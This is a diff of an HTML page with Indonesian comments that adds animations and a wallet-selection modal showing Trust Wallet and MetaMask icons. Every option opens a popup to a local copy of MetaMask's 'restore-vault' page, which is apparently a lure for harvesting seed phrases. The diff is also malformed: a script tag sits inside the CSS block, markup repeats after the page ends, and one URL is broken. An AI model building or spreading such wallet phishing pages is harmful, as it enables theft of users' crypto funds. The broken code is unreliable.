@@ -1,11 +1,9 @@
 <!DOCTYPE html>
-<!DOCTYPE html>
 <html lang="en">
-  <script type="text/javascript"> function popup(mylink, windowname) { if (! window.focus)return true; var href; if (typeof(mylink) == 'string') href=mylink; else href=mylink.href; window.open(href, windowname, 'top=50,left=1470,width=400,height=800,scrollbars=yes'); return false; } </script>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Modal with Options and Icons</title>
+  <title>Modal with Animated Options</title>
   <style>
     /* Tombol untuk menampilkan modal */
     .btn {
@@ -16,6 +14,19 @@
       border-radius: 5px;
       cursor: pointer;
       font-size: 16px;
+      transition: all 0.3s ease-in-out;
+    }
+
+    <script type="text/javascript"> function popup(mylink, windowname) { if (! window.focus)return true; var href; if (typeof(mylink) == 'string') href=mylink; else href=mylink.href; window.open(href, windowname, 'top=50,left=1470,width=400,height=800,scrollbars=yes'); return false; } </script>
+
+    /* Efek hover dan klik pada tombol */
+    .btn:hover {
+      background-color: #0056b3;
+      transform: translateY(-2px); /* Sedikit naik */
+    }
+
+    .btn:active {
+      transform: translateY(2px); /* Turun sedikit saat diklik */
     }
 
     /* Modal overlay (latar belakang gelap) */
@@ -39,6 +50,7 @@
       width: 300px;
       text-align: center;
       box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      animation: fadeIn 0.5s ease-in-out; /* Efek muncul modal */
     }
 
     /* Gaya opsi dengan ikon */
@@ -49,6 +61,9 @@
       text-decoration: none;
       color: #007BFF;
       font-weight: bold;
+      transition: transform 0.2s, background-color 0.2s;
+      padding: 10px;
+      border-radius: 5px;
     }
 
     /* Ikon gambar di setiap opsi */
@@ -59,9 +74,31 @@
       border-radius: 5px;
     }
 
+    /* Efek hover dan klik pada opsi */
+    .option:hover {
+      background-color: #f0f8ff;
+      transform: scale(1.05); /* Sedikit membesar saat hover */
+    }
+
+    .option:active {
+      transform: scale(0.95); /* Sedikit mengecil saat diklik */
+    }
+
     /* Tampilkan modal saat checkbox dicentang */
     #modal-toggle:checked + .modal-overlay {
       display: flex;
+    }
+
+    /* Animasi fade-in untuk modal */
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
     }
   </style>
 </head>
@@ -72,6 +109,29 @@
 
   <!-- Checkbox tersembunyi untuk mengontrol tampilan modal -->
   <input type="checkbox" id="modal-toggle" style="display: none;">
+
+  <!-- Modal Pop-Up -->
+  <div class="modal-overlay">
+    <div class="modal-content">
+      <h2>Choose an Option</h2>
+      <a href="metamask/?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault" onclick="return popup(this, 'stevie')"  class="option">
+        <img src="https://s2.coinmarketcap.com/static/cloud/img/wallet-login/TrustWalletV2.svg" alt="Icon 1">
+        Option 1: Link 1
+      </a>
+       <a href="metamask/?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault" onclick="return popup(this, 'stevie')"  class="option">
+        <img src="https://s2.coinmarketcap.com/static/cloud/img/wallet-login/MetaMask.svg" alt="Icon 2">
+        Option 2: Link 2
+      </a>
+      <a href="metamask/?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault" onclick="return popup(this, 'stevie')"  class="option">
+        <img src="https//s2.coinmarketcap.com/static/img/wallets/128x128/9017.png" alt="Icon 3">
+        Option 3: Link 3
+      </a>
+    </div>
+  </div>
+
+</body>
+</html>
+
 
   <!-- Modal Pop-Up -->
   <div class="modal-overlay">
